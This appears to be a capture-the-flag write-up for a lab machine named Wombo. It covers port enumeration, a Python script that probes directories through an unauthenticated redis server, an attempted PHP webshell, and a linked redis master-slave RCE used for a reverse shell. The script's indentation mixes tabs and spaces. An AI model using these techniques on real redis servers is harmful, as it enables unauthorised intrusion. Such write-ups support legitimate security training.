# Wombo
### Enumeration
We have access to ports 22, 80, 6379, 8080 and 27017. 80 is an nginx default webserver. 8080 is a NodeBB instance. 6379 is a redis instance that is open to unauthenticated users. 27017 is a mongo instance.

Initially I tried creating a user on NodeBB and using an exploit that is supposed to change the admin password. I couldn't seem to login though (may return to this).

Next, I had a look at redis. It's possible to enumerate directories on the machine using the redis command `config set dir <PATH>`. The response is different depending on whether the directory exists or not. I used the below script to enumerate `/var/www` and found `/var/www/html`.

```python
"""
For enumerating directories via redis
"""
import argparse
import socket
import sys

def run(host: str, port: int, wordlist_filename: str, prefix: str):
    with open(wordlist_filename, 'r') as f:
        wordlist = f.read().split('\n')

	for word in wordlist:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as redis_socket:
			redis_socket.connect((host, port))
			redis_socket.sendall(f"config set dir {prefix}/{word}\n".encode())
			response = redis_socket.recv(1024)
			
			if response == b'+OK\r\n':
				print(f"found directory {prefix}/{word}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--wordlist", required=True)
    parser.add_argument("--host", required=True)
    parser.add_argument("--prefix", required=True)
    parser.add_argument("--port", type=int, default=6379, required=False)
    args = parser.parse_args()
    run(args.host, args.port, args.wordlist, args.prefix)
```

I tried to write a php webshell to the webroot of the server running on port 80, but visiting the path just triggered a download.

### Foothold

Searching the version of redis that is running (`5.0.9`), there's an [unauthenticated RCE vulnerability](https://github.com/Ridter/redis-rce) (the exploit also requires a `.so` file which can be found in [this repo](https://github.com/n0b0dyCN/redis-rogue-server)) for versions 4.x/5.x. See [this article](https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0) for an explanation of the exploit.

We can get a reverse shell using this exploit. Note that we're only able to use ports that are open on the target (e.g. when making requests to the kali box, we can only make requests to kali machine ports 22, 80, 6379, 8080, 27017).